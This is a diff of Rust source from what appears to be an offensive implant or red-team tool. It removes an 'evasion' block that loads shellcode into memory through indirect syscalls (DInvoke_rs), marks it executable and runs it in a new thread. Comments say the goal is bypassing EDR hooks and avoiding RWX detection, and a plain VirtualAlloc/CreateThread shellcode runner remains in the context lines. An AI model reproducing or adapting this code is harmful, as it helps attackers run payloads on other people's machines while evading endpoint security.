@@ -136,76 +136,11 @@ pub fn inject_shellcode(
 }
 
 /// Execute shellcode in a thread (in-process execution)
+// Future: integrate DInvoke_rs by @Kudaes for indirect syscalls
 #[cfg(target_os = "windows")]
 unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
     let buffer_size = shellcode.len();
 
-    #[cfg(feature = "evasion")]
-    {
-        // Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
-        // Bypasses EDR hooks on kernel32/ntdll by resolving syscall numbers at runtime
-        //
-        // DInvoke_rs::dinvoke module provides:
-        //   nt_allocate_virtual_memory(handle, base_addr, zero_bits, size, alloc_type, protect)
-        //   nt_protect_virtual_memory(handle, base_addr, size, new_protect, old_protect)
-        // where handle is isize (HANDLE as raw value, -1 = current process)
-
-        let handle: isize = -1; // NtCurrentProcess
-        let mut base_address: *mut std::ffi::c_void = ptr::null_mut();
-        let mut region_size: usize = buffer_size;
-
-        let status = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
-            handle,
-            &mut base_address,
-            0,
-            &mut region_size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
-
-        if status != 0 {
-            return Err(format!("NtAllocateVirtualMemory failed: 0x{:X}", status));
-        }
-
-        let executable_mem = base_address;
-        ptr::copy_nonoverlapping(shellcode.as_ptr(), executable_mem as *mut u8, buffer_size);
-
-        let mut old_protect: u32 = 0;
-        let status = dinvoke_rs::dinvoke::nt_protect_virtual_memory(
-            handle,
-            &mut base_address,
-            &mut region_size,
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        );
-
-        if status != 0 {
-            return Err(format!("NtProtectVirtualMemory failed: 0x{:X}", status));
-        }
-
-        let mut thread_id: u32 = 0;
-        let thread_handle = CreateThread(
-            ptr::null_mut(), 0, Some(mem::transmute(executable_mem)),
-            ptr::null_mut(), 0, &mut thread_id,
-        );
-
-        if thread_handle.is_null() {
-            return Err(format!("CreateThread failed. Error: {}", GetLastError()));
-        }
-
-        let wait_result = WaitForSingleObject(thread_handle, 1000);
-        CloseHandle(thread_handle);
-
-        if wait_result == WAIT_TIMEOUT {
-            return Ok(format!("Shellcode started ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
-        } else {
-            return Ok(format!("Shellcode completed ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
-        }
-    }
-
-    #[cfg(not(feature = "evasion"))]
-    {
-    // Allocate RW memory first (avoids RWX detection)
     let executable_mem = VirtualAlloc(
         ptr::null_mut(),
         buffer_size,
@@ -271,7 +206,6 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
             "Shellcode execution completed ({} bytes) in thread {} (exit code: {}, wait result: {}).",
             buffer_size, thread_id, exit_code, wait_result
         ))
-    }
     }
 }
 
